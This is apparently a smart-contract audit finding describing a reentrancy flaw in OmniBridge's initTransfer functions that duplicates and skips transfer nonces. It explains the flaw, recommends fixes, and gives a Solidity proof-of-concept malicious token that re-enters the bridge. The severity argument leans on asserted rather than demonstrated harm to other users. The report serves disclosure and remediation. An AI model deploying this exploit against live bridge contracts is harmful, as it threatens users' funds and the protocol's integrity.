### Title
Re-entrancy via Unsanitized `tokenAddress` Causes Nonce Collision and Permanent Fund Lock — (`File: evm/src/omni-bridge/contracts/OmniBridge.sol`)

### Summary

`OmniBridge.initTransfer` accepts an arbitrary, user-controlled `tokenAddress` and makes an external call to it before the `InitTransfer` event and `initTransferExtension` read `currentOriginNonce` from storage. Because there is no re-entrancy guard and `currentOriginNonce` is never snapshotted into a local variable, a malicious token can re-enter `initTransfer`, advance the shared nonce counter, and cause both the outer and inner call to emit the same nonce. The result is one nonce that is never published and one nonce that is published twice — permanently locking the outer caller's bridged tokens on the EVM side with no claimable settlement on NEAR.

### Finding Description

In `OmniBridge.initTransfer` (lines 373–437):

```
currentOriginNonce += 1;                          // line 381 — nonce advanced
...
IERC20(tokenAddress).safeTransferFrom(            // line 407 — external call to
    msg.sender, address(this), amount             //   user-controlled address
);
...
initTransferExtension(..., currentOriginNonce,    // line 418 — reads storage
    ...);
emit BridgeTypes.InitTransfer(
    ..., currentOriginNonce, ...                  // line 430 — reads storage again
);
```

The `else` branch (lines 406–411) is reached for any `tokenAddress` that is neither in `customMinters` nor in `isBridgeToken` — i.e., any arbitrary ERC-20 token. There is no whitelist requirement and no `nonReentrant` guard anywhere in the contract (confirmed: zero matches for `nonReentrant` or `ReentrancyGuard` across all EVM contracts).

`currentOriginNonce` is a storage variable. It is incremented once at the top of the function but is read again — from storage — at lines 418 and 430. If a re-entrant call to `initTransfer` occurs during the external `safeTransferFrom`, the re-entrant call increments `currentOriginNonce` a second time. When control returns to the outer call, both `initTransferExtension` and the `InitTransfer` event read the already-advanced storage value, producing a duplicate nonce.

**Step-by-step:**

| Step | `currentOriginNonce` | Action |
|------|----------------------|--------|
| Outer call enters | N → **N+1** | `currentOriginNonce += 1` |
| Outer call hits `safeTransferFrom` | N+1 | External call to malicious token |
| Re-entrant call enters | N+1 → **N+2** | `currentOriginNonce += 1` |
| Re-entrant call completes | N+2 | Emits `InitTransfer(nonce=N+2)`, publishes Wormhole msg with nonce N+2 |
| Outer call resumes | N+2 | `initTransferExtension(..., currentOriginNonce=N+2, ...)` |
| Outer call emits event | N+2 | Emits `InitTransfer(nonce=N+2)` — **duplicate** |

Nonce N+1 is never emitted. Nonce N+2 is emitted twice.

The same pattern exists in `initTransfer1155` (lines 439–490): `currentOriginNonce` is incremented at line 448, then `IERC1155(tokenAddress).safeTransferFrom(...)` is called at line 458 with a fully user-controlled `tokenAddress`, and `currentOriginNonce` is read from storage again at lines 471 and 483.

### Impact Explanation

**Critical — Permanent freezing / irrecoverable lock of user funds.**

The NEAR-side prover uses `(origin_chain, origin_nonce)` as a unique transfer identifier with replay protection. After the re-entrant call finalizes nonce N+2 on NEAR, the outer call's duplicate nonce N+2 message is rejected as a replay. The outer caller's ERC-20 tokens have already been transferred into the bridge contract (line 408–410) but can never be claimed on NEAR. Those funds are permanently locked with no recovery path.

Additionally, nonce N+1 is silently skipped: any off-chain system expecting a contiguous nonce sequence will stall or miscount, potentially blocking subsequent legitimate transfers.

### Likelihood Explanation

**High.** The attack requires only:
1. Deploying a malicious ERC-20 contract whose `transferFrom` re-enters `initTransfer`.
2. Calling `initTransfer` with that token address — a fully public, permissionless entry point.

No privileged role, leaked key, or colluding party is needed. The `else` branch is the normal path for all native ERC-20 tokens (USDC, WETH, etc.) being bridged, so the vulnerable code path is exercised in normal protocol operation.

### Recommendation

1. **Add `nonReentrant`** (OpenZeppelin `ReentrancyGuardUpgradeable`) to `initTransfer` and `initTransfer1155`.
2. **Snapshot the nonce into a local variable** immediately after incrementing it, and use that local variable in all subsequent reads (`initTransferExtension` call and `InitTransfer` event):

```solidity
currentOriginNonce += 1;
uint64 originNonce = currentOriginNonce;   // snapshot before any external call
...
IERC20(tokenAddress).safeTransferFrom(...);
...
initTransferExtension(..., originNonce, ...);
emit BridgeTypes.InitTransfer(..., originNonce, ...);
```

Both mitigations are needed: the snapshot alone does not prevent re-entrancy from corrupting the nonce counter for other concurrent callers.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IOmniBridge {
    function initTransfer(
        address tokenAddress,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousToken {
    IOmniBridge public bridge;
    address public attacker;
    bool public reentered;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
        attacker = msg.sender;
    }

    // ERC-20 stub: transferFrom re-enters initTransfer
    function transferFrom(address, address, uint256) external returns (bool) {
        if (!reentered) {
            reentered = true;
            // Re-enter: increments currentOriginNonce to N+2,
            // emits InitTransfer(nonce=N+2), publishes Wormhole msg N+2
            bridge.initTransfer(address(this), 1, 0, 0, "attacker.near", "");
        }
        return true;
    }

    // Minimal ERC-20 stubs
    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }
    function balanceOf(address) external pure returns (uint256) { return type(uint256).max; }
}

// Attack:
// 1. Deploy MaliciousToken(bridgeAddress)
// 2. Call bridge.initTransfer(maliciousToken, 1, 0, 0, "victim.near", "")
//    → currentOriginNonce: N → N+1
//    → safeTransferFrom triggers re-entry
//      → currentOriginNonce: N+1 → N+2
//      → InitTransfer(nonce=N+2) emitted, Wormhole msg published with nonce N+2
//    → outer call resumes, reads currentOriginNonce=N+2
//    → InitTransfer(nonce=N+2) emitted again (DUPLICATE)
//    → Wormhole msg published again with nonce N+2 (DUPLICATE)
// Result: nonce N+1 never published; nonce N+2 published twice.
//         Outer caller's tokens locked in bridge, unclaimable on NEAR.
```
